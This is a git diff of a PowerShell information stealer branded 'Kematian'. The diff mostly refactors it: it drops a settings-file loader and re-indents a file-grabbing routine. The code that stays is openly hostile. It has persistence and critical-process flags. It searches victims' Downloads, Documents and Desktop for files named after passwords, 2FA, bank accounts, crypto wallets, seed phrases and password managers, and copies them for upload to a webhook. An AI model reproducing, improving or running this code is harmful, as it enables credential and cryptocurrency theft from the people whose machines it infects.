@@ -5,15 +5,7 @@ $criticalprocess = $true
 $melt = $false
 $fakeerror = $false
 $persistence = $true
-$settings = $false
 
-if (Test-Path -Path "$env:APPDATA\Kematian\settings.ps1") {
-    $settings = $true
-    . "$env:APPDATA\Kematian\settings.ps1"
-    if ($debug) {
-        Write-Host "[!] Settings Loaded" -ForegroundColor Green
-    }
-}
 
 if ($debug) {
     $ProgressPreference = 'Continue'
@@ -158,21 +150,6 @@ function Backup-Data {
     $folders = @($folder_general, $folder_messaging, $folder_gaming, $folder_crypto, $folder_vpn, $folder_email, $important_files, $browser_data, $filezilla_bkp)
     $folders | ForEach-Object {
         New-Item -ItemType Directory -Path $_ -Force | Out-Null
-    }
-
-    if (-not ($settings)) {
-        $settings = @"
-`$debug = `$$debug
-`$blockhostsfile = `$$blockhostsfile
-`$criticalprocess = `$$criticalprocess
-`$melt = `$$melt
-`$fakeerror = `$$fakeerror
-`$persistence = `$$persistence
-"@
-        $settings | Out-File -FilePath "$env:APPDATA\Kematian\settings.ps1" -Encoding UTF8
-        if ($debug) {
-            Write-Host "[!] Settings Created" -ForegroundColor Green
-        }
     }
 
     #bulk data (added build ID with banner)
@@ -755,34 +732,34 @@ Pass: $decodedPass
     #ExportPrivateKeys
 
     function FilesGrabber {
-    $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
-    $keywords = @("2fa","account","auth","backup","bank","bitcoin","binance","btc","backup","bitwarden","code","casino","coinbase","crypto","dashlane","discord","eth","exodus","facebook","funds","info","kraken","kucoin","keepass","keys","lastpass","login","ledger","mail","memo","mnemonic","metamask","note","nordpass","pass","paypal","pw","recovery","remote","secret","skrill","pgp","private","passphrase","seedphrase","server","solana","syncthing","trading","token","trezor","tether","venmo","wallet")
-    $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
-    foreach ($path in $paths) {
-        $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
-            $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
-        }
-        foreach ($file in $files) {
-            $destination = Join-Path -Path $important_files -ChildPath $file.Name
-            if ($file.FullName -ne $destination) {
-                Copy-Item -Path $file.FullName -Destination $destination -Force
+        $allowedExtensions = @("*.rdp", "*.txt", "*.doc", "*.docx", "*.pdf", "*.csv", "*.xls", "*.xlsx", "*.ldb", "*.log")
+        $keywords = @("2fa", "account", "auth", "backup", "bank", "bitcoin", "binance", "btc", "backup", "bitwarden", "code", "casino", "coinbase", "crypto", "dashlane", "discord", "eth", "exodus", "facebook", "funds", "info", "kraken", "kucoin", "keepass", "keys", "lastpass", "login", "ledger", "mail", "memo", "mnemonic", "metamask", "note", "nordpass", "pass", "paypal", "pw", "recovery", "remote", "secret", "skrill", "pgp", "private", "passphrase", "seedphrase", "server", "solana", "syncthing", "trading", "token", "trezor", "tether", "venmo", "wallet")
+        $paths = @("$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop")
+        foreach ($path in $paths) {
+            $files = Get-ChildItem -Path $path -Recurse -Include $allowedExtensions | Where-Object {
+                $_.Length -lt 1mb -and $_.Name -match ($keywords -join '|')
+            }
+            foreach ($file in $files) {
+                $destination = Join-Path -Path $important_files -ChildPath $file.Name
+                if ($file.FullName -ne $destination) {
+                    Copy-Item -Path $file.FullName -Destination $destination -Force
+                }
             }
         }
-    }
-	 # Send info about the keywords that match a grabbed file
-    $keywordsUsed = @()
-    foreach ($keyword in $keywords) {
-        foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
-            if ($file.Name -like "*$keyword*") {
-                if ($file.Length -lt 1mb) {
-                    if ($keywordsUsed -notcontains $keyword) {
-						$keywordsUsed += $keyword
-                        $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
+        # Send info about the keywords that match a grabbed file
+        $keywordsUsed = @()
+        foreach ($keyword in $keywords) {
+            foreach ($file in (Get-ChildItem -Path $important_files -Recurse)) {
+                if ($file.Name -like "*$keyword*") {
+                    if ($file.Length -lt 1mb) {
+                        if ($keywordsUsed -notcontains $keyword) {
+                            $keywordsUsed += $keyword
+                            $keywordsUsed | Out-File "$folder_general\Important_Files_Keywords.txt" -Force
+                        }
                     }
                 }
             }
         }
-    }
     }
     FilesGrabber
 
@@ -1018,7 +995,7 @@ FileZilla: $filezilla_info
         'False'
     }
 
-	Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
+    Write-Host "[!] Uploading the extracted data !" -ForegroundColor Green
     $embed_and_body = @{
         "username"    = "Kematian"
         "content"     = "@everyone"
